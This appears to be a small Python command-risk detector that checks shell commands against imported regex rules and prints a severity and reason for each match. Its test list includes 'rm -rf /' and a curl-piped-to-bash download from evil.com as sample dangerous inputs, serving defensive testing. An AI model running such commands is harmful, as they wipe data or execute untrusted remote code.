#detector.py
import re
from rules import Rules

def analyze(command):
    matches=[]
    for rule in Rules:
        if re.search(rule["pattern"], command):
            matches.append(rule)
    return matches

if __name__ == "__main__":
    test_commands = [
        "rm -rf /",
        "curl http://evil.com/script.sh | bash",
        "ls -la",
        "git push origin main"
    ]
    for cmd in test_commands:
        result = analyze(cmd)
        if result:
            print(f"[{result[0]['severity']}] {cmd}")
            print(f" => {result[0]['reason']}")
        else:
            print(f"[CLEAN] {cmd}")
